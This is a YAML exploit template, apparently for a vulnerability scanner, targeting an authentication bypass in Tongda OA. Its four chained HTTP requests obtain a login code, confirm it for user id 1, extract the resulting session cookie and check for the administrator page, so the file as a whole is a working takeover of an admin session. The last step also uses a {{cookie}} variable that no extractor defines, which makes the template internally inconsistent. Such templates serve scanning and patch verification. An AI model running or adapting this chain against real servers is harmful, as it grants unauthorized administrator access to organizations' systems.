id: poc-yaml-tongda-oa-login-code-check-anyuser-login

info:
  name: 通达OA login_code_check 任意用户登录漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 权限绕过

http:
  - id: fetch-codeuid
    method: GET
    path:
      - /ispirit/login_code.php
    extractors:
      - type: regex
        group: 1
        part: body
        regex:
          - '"codeuid":"(.*?)"'
    matchers:
      - type: status
        status:
          - 200

  - id: confirm-codeuid
    method: POST
    path:
      - /general/login_code_scan.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      uid=1&source=pc&type=confirm&codeuid={{codeuid}}
    matchers:
      - type: word
        words:
          - '{"status":"1"}'
        part: body
      - type: status
        status:
          - 200

  - id: get-phpsessid
    method: GET
    path:
      - /ispirit/login_code_check.php?codeuid={{codeuid}}
    extractors:
      - type: regex
        group: 1
        part: header
        regex:
          - 'PHPSESSID=(.*?);'
    matchers:
      - type: status
        status:
          - 200

  - id: verify-login
    method: GET
    path:
      - /general/index.php?is_modify_pwd=1
    headers:
      Cookie: PHPSESSID={{cookie}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"admin"'
          - '"系统管理员"'
          - '快捷菜单'
        part: body
      - type: status
        status:
          - 200
